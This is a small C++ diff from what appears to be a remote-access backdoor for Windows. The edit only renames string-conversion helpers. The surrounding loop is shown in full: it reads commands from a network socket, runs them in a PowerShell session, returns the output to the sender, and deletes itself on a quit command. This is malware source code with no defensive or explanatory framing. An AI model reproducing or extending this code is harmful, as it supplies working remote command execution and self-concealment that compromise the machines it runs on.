@@ -61,15 +61,15 @@ VOID CommandListenerLoop(SOCKET socket, PowerShellSession& psSession) {
         }
 
         wcarrRecvbuf[iBytesReceived / sizeof(WCHAR)] = '\0';
-        std::string szCommand = wstring_to_utf8(wcarrRecvbuf);
+        std::string szCommand = WstringToString(wcarrRecvbuf);
 
-        if (szCommand == wstring_to_utf8(QUIT_COMMAND)) {
+        if (szCommand == WstringToString(QUIT_COMMAND)) {
             bIsRunning = FALSE;
             SelfDelete();
         }
         else {
             szCommandOutput = psSession.RunCommand(szCommand);
-            PrependStringSize(utf8_to_wstring(szCommandOutput), wszFinalData);
+            PrependStringSize(StringToWstring(szCommandOutput), wszFinalData);
             send(socket, reinterpret_cast<const CHAR*>(wszFinalData.data()), wszFinalData.length() * sizeof(WCHAR), 0);
         }
     }
